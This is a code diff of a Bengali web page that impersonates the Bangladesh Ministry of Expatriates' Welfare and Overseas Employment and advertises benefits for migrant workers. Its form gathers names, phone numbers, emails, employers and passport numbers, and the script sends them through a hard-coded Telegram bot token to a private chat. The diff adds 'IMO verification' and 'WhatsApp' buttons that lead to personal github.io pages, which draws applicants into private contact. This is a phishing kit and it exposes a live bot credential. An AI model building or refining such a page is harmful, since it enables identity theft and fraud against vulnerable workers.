@@ -1,3 +1,4 @@
+html
 <!DOCTYPE html>
 <html lang="bn">
 <head>
@@ -17,11 +18,12 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
 
   <style>
-    body { font-family: 'Kalpurush', sans-serif; background: #f8fafc; }
-    .card { background: #fff; border-radius: 1rem; box-shadow: 0 4px S15px rgba(0,0,0,0.08); padding: 1.5rem; }
-    .accordion-content { transition: max-height 0.4s ease-in-out; overflow: hidden; max-height: 0; }
-    @keyframes fadeUp { from{opacity:0; transform:translateY(15px);} to{opacity:1; transform:translateY(0);} }
-    .animate { animation: fadeUp 0.6s ease-out forwards; }
+    body { font-family: 'Kalpurush', sans-serif; background: linear-gradient(to bottom right, #eff6ff, #f0fdfa); }
+    .card { @apply bg-white rounded-xl shadow-lg p-6 transition-all duration-300 hover:shadow-2xl hover:-translate-y-1; }
+    .accordion-content { transition: max-height 0.5s ease-in-out; overflow: hidden; max-height: 0; }
+    @keyframes fadeUp { from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
+    .animate { animation: fadeUp 0.7s ease-out forwards; }
+    .btn { @apply w-full block text-center text-white py-2.5 px-4 rounded-lg font-semibold transition-transform duration-300 hover:scale-105; }
   </style>
 </head>
 <body class="antialiased">
@@ -41,9 +43,9 @@
 
 <main class="container mx-auto p-4 md:p-8">
 
-  <!-- সরকারি সুবিধাসমূহ (সম্পূর্ণ) -->
-  <section class="card animate mb-8">
-    <h2 class="text-2xl font-bold text-gray-800 mb-3 border-b pb-2">🔹 সরকারি সুবিধাসমূহ</h2>
+  <!-- সরকারি সুবিধাসমূহ -->
+  <section class="card animate mb-8 border-t-4 border-teal-500">
+    <h2 class="text-2xl font-bold text-gray-800 mb-3 border-b pb-3 flex items-center"><i class="fas fa-gift mr-3 text-teal-600"></i> সরকারি সুবিধাসমূহ</h2>
     <div class="space-y-3 mt-4">
       <div class="border rounded-lg overflow-hidden">
         <button class="accordion-btn w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 text-gray-700 font-semibold transition-colors">
@@ -57,7 +59,7 @@
         </button>
         <div class="accordion-content p-4 pt-0 text-gray-600">বৈধ চ্যানেলে রেমিট্যান্স পাঠালে ২.৫% থেকে ৫% পর্যন্ত প্রণোদনা।</div>
       </div>
-      <div class="border rounded-lg overflow-hidden">
+       <div class="border rounded-lg overflow-hidden">
         <button class="accordion-btn w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 text-gray-700 font-semibold transition-colors">
           <span>প্রবাসী পেনশন স্কিম (প্রবাস)</span><span class="text-xl transform transition-transform">+</span>
         </button>
@@ -67,73 +69,72 @@
         <button class="accordion-btn w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 text-gray-700 font-semibold transition-colors">
           <span>কল্যাণ বোর্ডের সদস্যপদ ও সুবিধা</span><span class="text-xl transform transition-transform">+</span>
         </button>
-        <div class="accordion-content p-4 pt-0 text-gray-600">প্রবাসী কর্মীদের কল্যাণ, প্রশিক্ষণ কেন্দ্র সম্প্রসারণ এবং সহায়ক কার্যক্রমে বাজেট ব্যবহার করা হয়। বিস্তারিত জানতে <a href="https://member.wewb.gov.bd/wewbm/createnewMemberHomeAll" target="_blank" class="text-blue-600 underline">WEWB সদস্যপদ</a> গ্রহণ করুন।</div>
+        <div class="accordion-content p-4 pt-0 text-gray-600">প্রবাসী কর্মীদের কল্যাণ ও প্রশিক্ষণের জন্য। বিস্তারিত জানতে <a href="https://member.wewb.gov.bd/wewbm/createnewMemberHomeAll" target="_blank" class="text-blue-600 underline font-semibold">WEWB সদস্যপদ</a> গ্রহণ করুন।</div>
       </div>
     </div>
   </section>
   
-  <!-- যোগাযোগ বক্সগুলো (পুনরায় যোগ করা হয়েছে) -->
-  <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
-    <div class="card border-l-4 border-green-500 animate">
-      <h4 class="text-xl font-bold text-green-800 mb-2">অফিশিয়াল ওয়েবসাইট</h4>
-      <p class="text-gray-600 mb-4">সর্বশেষ তথ্যের জন্য অফিশিয়াল সাইট ভিজিট করুন।</p>
-      <a href="https://wewb.gov.bd/" target="_blank" class="w-full block text-center bg-green-500 text-white py-2 px-4 rounded hover:bg-green-600 transition">ওয়েবসাইট ভিজিট</a>
-    </div>
-    <div class="card border-l-4 border-teal-500 animate">
-      <h4 class="text-xl font-bold text-teal-800 mb-2">IMO ভেরিফিকেশন</h4>
-      <p class="text-gray-600 mb-4">আবেদন যাচাই করতে কর্মকর্তার সাথে যুক্ত হোন।</p>
-      <a href="https://polokmd851-png.github.io/nusrat_imo.html/" target="_blank" class="w-full block text-center bg-teal-500 text-white py-2 px-4 rounded hover:bg-teal-600 transition">IMO তে যুক্ত হোন</a>
-    </div>
-    <div class="card border-l-4 border-blue-500 animate">
-      <h4 class="text-xl font-bold text-blue-800 mb-2">WhatsApp যোগাযোগ</h4>
-      <p class="text-gray-600 mb-4">জরুরি প্রয়োজনে সরাসরি কথা বলুন।</p>
-      <a href="https://wa.me/8801712345678" target="_blank" class="w-full block text-center bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 transition">WhatsApp করুন</a>
-    </div>
+  <!-- শুধুমাত্র অফিশিয়াল ওয়েবসাইট বক্স -->
+  <div class="grid grid-cols-1 mb-8">
+      <div class="card border-t-4 border-green-500 animate">
+        <h4 class="text-xl font-bold text-green-800 mb-2 flex items-center"><i class="fas fa-globe mr-3"></i>অফিশিয়াল ওয়েবসাইট</h4>
+        <p class="text-gray-600 mb-4">সর্বশেষ তথ্যের জন্য অফিশিয়াল সাইট ভিজিট করুন।</p>
+        <a href="https://wewb.gov.bd/" target="_blank" class="btn bg-green-500 hover:bg-green-600"><i class="fas fa-external-link-alt mr-2"></i>ওয়েবসাইট ভিজিট</a>
+      </div>
   </div>
 
-  <!-- আবেদন ফর্ম টগল -->
-  <section class="card animate text-center mb-6">
-    <h2 class="text-2xl font-bold text-gray-800 border-b pb-2">সরকারি সেবার জন্য আবেদন করুন</h2>
-    <p class="text-gray-600 mt-3">নিচের ফর্মটি পূরণ করে আবেদন জমা দিন।</p>
-    <!-- ফর্মটি এখন ডিফল্টভাবে খোলা থাকবে, তাই এই বাটনটি লুকানো -->
-    <button onclick="toggleForm()" id="apply-btn" class="hidden mt-4 bg-green-600 text-white font-bold py-3 px-6 rounded-lg hover:bg-green-700 transition">
-      আবেদন ফর্ম খুলুন
-    </button>
+  <!-- আবেদন ফর্ম টগল (পরিবর্তিত) -->
+  <section class="card animate text-center">
+    <h2 class="text-2xl font-bold text-gray-800 border-b pb-3">সরকারি সেবার জন্য আবেদন করুন</h2>
+    <p class="text-gray-600 mt-3">নিচের ফর্মটি পূরণ করে আপনার আবেদন জমা দিন।</p>
+    
+    <!-- নতুন জায়গায় যোগাযোগ বক্স -->
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 my-6 text-left">
+        <div class="bg-teal-50 p-4 rounded-lg border-l-4 border-teal-500 shadow-sm">
+          <h4 class="text-lg font-bold text-teal-800 mb-2">IMO ভেরিফিকেশন</h4>
+          <p class="text-gray-600 mb-4 text-sm">আবেদন যাচাই করতে কর্মকর্তার সাথে যুক্ত হোন।</p>
+          <a href="https://nusratjahan9629991-art.github.io/Nusrat-imo-frofile/" target="_blank" class="btn bg-teal-500 hover:bg-teal-600 text-sm"><i class="fas fa-user-check mr-2"></i>IMO তে যুক্ত হোন</a>
+        </div>
+        <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-blue-500 shadow-sm">
+          <h4 class="text-lg font-bold text-blue-800 mb-2">WhatsApp যোগাযোগ</h4>
+          <p class="text-gray-600 mb-4 text-sm">জরুরি প্রয়োজনে সরাসরি কথা বলুন।</p>
+          <a href="https://nusratjahan9629991-art.github.io/Add-Nusrat-Jahan-WhatsApp-Account/" target="_blank" class="btn bg-blue-500 hover:bg-blue-600 text-sm"><i class="fab fa-whatsapp mr-2"></i>WhatsApp করুন</a>
+        </div>
+    </div>
   </section>
 
   <!-- ফর্ম -->
-  <form id="appForm" class="card space-y-4 animate">
-    <h3 class="text-lg font-bold border-b pb-2 text-gray-700">ব্যক্তিগত তথ্য</h3>
+  <form id="appForm" class="card space-y-4 animate mt-8">
+    <h3 class="text-xl font-bold border-b pb-2 text-gray-700">ব্যক্তিগত তথ্য</h3>
     <div class="grid md:grid-cols-2 gap-4">
-      <input type="text" id="full_name" name="full_name" placeholder="পূর্ণ নাম" required class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
-      <input type="text" id="father_name" name="father_name" placeholder="পিতার নাম" class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
-      <input type="tel" id="mobile_number" name="mobile_number" placeholder="মোবাইল নম্বর" required class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
-      <input type="email" id="email" name="email" placeholder="ইমেইল" class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
+      <input type="text" id="full_name" name="full_name" placeholder="পূর্ণ নাম" required class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
+      <input type="text" id="father_name" name="father_name" placeholder="পিতার নাম" class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
+      <input type="tel" id="mobile_number" name="mobile_number" placeholder="মোবাইল নম্বর" required class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
+      <input type="email" id="email" name="email" placeholder="ইমেইল" class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
     </div>
 
-    <h3 class="text-lg font-bold border-b pb-2 text-gray-700 mt-4">কর্মসংস্থান তথ্য</h3>
+    <h3 class="text-xl font-bold border-b pb-2 text-gray-700 mt-4">কর্মসংস্থান তথ্য</h3>
     <div class="grid md:grid-cols-2 gap-4">
-      <input type="text" id="current_country" name="current_country" list="countries" placeholder="বর্তমান দেশ" class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
+      <input type="text" id="current_country" name="current_country" list="countries" placeholder="বর্তমান দেশ" class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
       <datalist id="countries"></datalist>
-      <input type="text" id="company_name" name="company_name" placeholder="কোম্পানির নাম" class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
-      <input type="text" id="passport_no" name="passport_no" placeholder="পাসপোর্ট নম্বর" class="border p-2 rounded w-full focus:ring-2 focus:ring-green-300">
+      <input type="text" id="company_name" name="company_name" placeholder="কোম্পানির নাম" class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
+      <input type="text" id="passport_no" name="passport_no" placeholder="পাসপোর্ট নম্বর" class="border p-3 rounded w-full focus:ring-2 focus:ring-teal-300">
     </div>
 
     <p class="text-sm text-gray-500 pt-2">দ্রষ্টব্য: ফাইল আপলোডের সুবিধা এই ফর্মে উপলব্ধ নয়।</p>
 
-    <button type="submit" class="w-full bg-green-600 text-white py-3 rounded font-bold hover:bg-green-700 transition disabled:bg-gray-400">আবেদন জমা দিন</button>
+    <button type="submit" class="w-full bg-gradient-to-r from-green-600 to-teal-600 text-white py-3 rounded-lg font-bold hover:from-green-700 hover:to-teal-700 transition disabled:bg-gray-400 disabled:from-gray-400 disabled:to-gray-500">আবেদন জমা দিন</button>
   </form>
 
   <p id="success" class="hidden text-green-700 font-semibold text-center mt-4 animate">✅ আবেদন সফলভাবে জমা হয়েছে!</p>
 </main>
 
-<footer class="bg-gray-100 text-center py-4 text-sm text-gray-600 mt-10 border-t">
+<footer class="bg-gray-200 text-center py-6 text-sm text-gray-600 mt-10 border-t">
   © ২০২৫ প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়
 </footer>
 
 <script>
-  // --- SECURITY WARNING ---
-  // Exposing your Telegram Bot Token on the client-side is a major security risk.
+  // --- SECURITY WARNING & TELEGRAM SETUP ---
   const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco";
   const CHAT_ID = "6658445342";
   const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -158,14 +159,6 @@
     });
   });
 
-  // Toggle form
-  const form = document.getElementById('appForm');
-  function toggleForm() {
-    form.classList.toggle('hidden');
-    const btn = document.getElementById('apply-btn');
-    btn.textContent = form.classList.contains('hidden') ? 'আবেদন ফর্ম খুলুন' : 'ফর্মটি বন্ধ করুন';
-  }
-
   // Load countries list
   fetch("https://restcountries.com/v3.1/all")
     .then(r => r.json())
@@ -183,6 +176,7 @@
     });
 
   // Submit form
+  const form = document.getElementById('appForm');
   form.addEventListener('submit', async e => {
     e.preventDefault();
     const btn = form.querySelector('button[type="submit"]');
